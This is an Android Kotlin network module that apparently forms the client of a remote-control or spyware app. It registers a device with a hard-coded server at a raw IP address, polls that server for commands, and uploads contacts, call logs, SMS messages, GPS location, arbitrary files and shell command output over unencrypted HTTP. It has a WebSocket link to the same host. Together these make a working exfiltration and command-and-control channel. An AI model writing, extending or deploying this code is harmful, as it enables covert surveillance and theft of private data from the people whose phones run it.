package com.abuzahra.admin.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

data class LinkResult(
    val success: Boolean,
    val deviceId: String = "",
    val error: String = ""
)

class ApiService private constructor(private val context: Context) {
    
    companion object {
        @Volatile
        private var instance: ApiService? = null
        
        fun getInstance(context: Context): ApiService {
            return instance ?: synchronized(this) {
                instance ?: ApiService(context.applicationContext).also { instance = it }
            }
        }
    }
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()
    
    private val baseUrl = "http://216.128.156.226:5000"
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
    
    /**
     * Verify link code from the web panel
     */
    suspend fun verifyLinkCode(code: String): LinkResult {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("code", code)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/verify_link")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    val responseBody = response.body?.string() ?: "{}"
                    val result = JSONObject(responseBody)
                    
                    if (response.isSuccessful && result.optBoolean("ok", false)) {
                        LinkResult(
                            success = true,
                            deviceId = result.optString("device_id", "")
                        )
                    } else {
                        LinkResult(
                            success = false,
                            error = result.optString("error", "HTTP ${response.code}")
                        )
                    }
                }
            } catch (e: Exception) {
                Log.e("ApiService", "verifyLinkCode error", e)
                LinkResult(success = false, error = e.message ?: "Unknown error")
            }
        }
    }
    
    suspend fun registerDevice(deviceId: String, deviceInfo: JSONObject): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("device_info", deviceInfo)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/register")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "registerDevice error", e)
                false
            }
        }
    }
    
    suspend fun fetchCommands(deviceId: String): JSONArray {
        return withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url("$baseUrl/api/device/$deviceId/commands")
                    .get()
                    .build()
                
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val body = response.body?.string() ?: "[]"
                        JSONArray(body)
                    } else {
                        JSONArray()
                    }
                }
            } catch (e: Exception) {
                Log.e("ApiService", "fetchCommands error", e)
                JSONArray()
            }
        }
    }
    
    suspend fun sendCommandResult(deviceId: String, commandId: String, status: String, message: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("command_id", commandId)
                    put("status", status)
                    put("message", message)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/command/result")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "sendCommandResult error", e)
                false
            }
        }
    }
    
    suspend fun uploadContacts(deviceId: String, contacts: JSONArray): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("contacts", contacts)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/contacts")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "uploadContacts error", e)
                false
            }
        }
    }
    
    suspend fun uploadCallLog(deviceId: String, calls: JSONArray): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("calls", calls)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/calls")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "uploadCallLog error", e)
                false
            }
        }
    }
    
    suspend fun uploadSMS(deviceId: String, messages: JSONArray): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("messages", messages)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/sms")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "uploadSMS error", e)
                false
            }
        }
    }
    
    suspend fun updateLocation(deviceId: String, latitude: Double, longitude: Double): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("latitude", latitude)
                    put("longitude", longitude)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/location")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "updateLocation error", e)
                false
            }
        }
    }
    
    suspend fun updateDeviceInfo(deviceId: String, deviceInfo: JSONObject): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("device_info", deviceInfo)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/info")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "updateDeviceInfo error", e)
                false
            }
        }
    }
    
    suspend fun uploadFile(deviceId: String, file: File, type: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("type", type)
                    .addFormDataPart("file", file.name, RequestBody.create("application/octet-stream".toMediaType(), file))
                    .build()
                
                val request = Request.Builder()
                    .url("$baseUrl/api/device/upload")
                    .post(requestBody)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "uploadFile error", e)
                false
            }
        }
    }
    
    suspend fun sendShellResult(deviceId: String, output: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("output", output)
                }
                
                val body = json.toString().toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/device/shell/result")
                    .post(body)
                    .build()
                
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("ApiService", "sendShellResult error", e)
                false
            }
        }
    }
    
    fun getWebSocketUrl(deviceId: String): String {
        return "ws://216.128.156.226:5000/ws/device/$deviceId"
    }
}
